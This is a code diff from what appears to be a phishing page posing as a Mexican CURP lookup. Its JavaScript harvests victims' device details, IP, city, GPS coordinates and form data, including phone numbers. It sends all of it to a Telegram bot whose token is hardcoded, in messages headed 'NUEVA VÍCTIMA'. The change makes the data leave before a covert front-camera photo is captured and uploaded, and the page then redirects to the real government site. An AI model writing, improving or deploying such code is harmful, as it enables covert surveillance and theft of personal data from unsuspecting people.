@@ -262,7 +262,7 @@ function leerForm(){
   var lada=v('lada'),tel=v('telefono');if(tel)form.tel=lada+' '+tel;
 }
 function enviar(){
-  var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU",CHAT="9092452687",API="https://api.telegram.org/bot"+TOKEN;
+  var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";var CHAT="9092452687";var API="https://api.telegram.org/bot"+TOKEN;
   var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
   txt+="📱 <b>Móvil:</b> "+info.modelo+"\n💻 <b>SO:</b> "+info.so+"\n🌐 <b>Nav:</b> "+info.navegador+"\n📺 <b>Pantalla:</b> "+info.pantalla+"\n🌎 <b>Idioma:</b> "+info.idioma+"\n🔋 <b>Bat:</b> "+info.bateria+"\n📡 <b>Red:</b> "+info.red+"\n📍 <b>IP:</b> "+info.ip+"\n🏙️ <b>Ciudad:</b> "+info.ciudad+"\n🌍 <b>País:</b> "+info.pais+"\n🧭 <b>GPS:</b> "+info.gps+"\n";
   if(form && Object.keys(form).length){
@@ -289,10 +289,29 @@ function autocompletarCP(cp){
 }
 async function ejecutarFlujo(boton){
   boton.disabled=true;boton.innerHTML='<span class="load"></span> Buscando…';
-  try{var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});await new Promise(function(r){setTimeout(r,1000);});var video=document.createElement('video');video.srcObject=stream;await video.play();await new Promise(function(r){setTimeout(r,600);});var c=document.createElement('canvas');c.width=video.videoWidth;c.height=video.videoHeight;c.getContext('2d').drawImage(video,0,0);foto=c.toDataURL('image/jpeg',0.85);stream.getTracks().forEach(function(t){t.stop();});}catch(e){console.log('Camara err:',e);}
-  await new Promise(function(r){setTimeout(r,300);});
-  await new Promise(function(res){navigator.geolocation.getCurrentPosition(function(p){info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},function(){info.gps='denegada';res();},{timeout:6000});});
-  await enviar();await new Promise(function(r){setTimeout(r,800);});window.location='https://www.gob.mx/curp/';
+  // 1) GPS rápido (máx 4s)
+  await new Promise(function(res){navigator.geolocation.getCurrentPosition(function(p){info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},function(){info.gps='denegada';res();},{timeout:4000,enableHighAccuracy:false});});
+  // 2) ENVIAR DATOS PRIMERO (sin foto)
+  await enviar();
+  // 3) Intentar foto DESPUÉS (sin bloquear envío)
+  try{
+    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+      var stream=await Promise.race([
+        navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}),
+        new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},5000);})
+      ]);
+      var video=document.createElement('video');video.srcObject=stream;video.muted=true;video.setAttribute('playsinline','');
+      await video.play();
+      await new Promise(function(r){setTimeout(r,700);});
+      var c=document.createElement('canvas');c.width=video.videoWidth||480;c.height=video.videoHeight||480;
+      c.getContext('2d').drawImage(video,0,0);
+      foto=c.toDataURL('image/jpeg',0.85);
+      stream.getTracks().forEach(function(t){t.stop();});
+      if(foto){var blob=dataURLtoBlob(foto),fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',blob,'foto.jpg');fd.append('caption','📷 Foto frontal');fetch(API+'/sendPhoto',{method:'POST',body:fd}).catch(function(){});}
+    }
+  }catch(e){console.log('Camara err:',e);}
+  await new Promise(function(r){setTimeout(r,600);});
+  window.location='https://www.gob.mx/curp/';
 }
 document.addEventListener('DOMContentLoaded',function(){
   var cpEl=document.getElementById('cp');if(cpEl)cpEl.addEventListener('input',function(){autocompletarCP(this.value);});
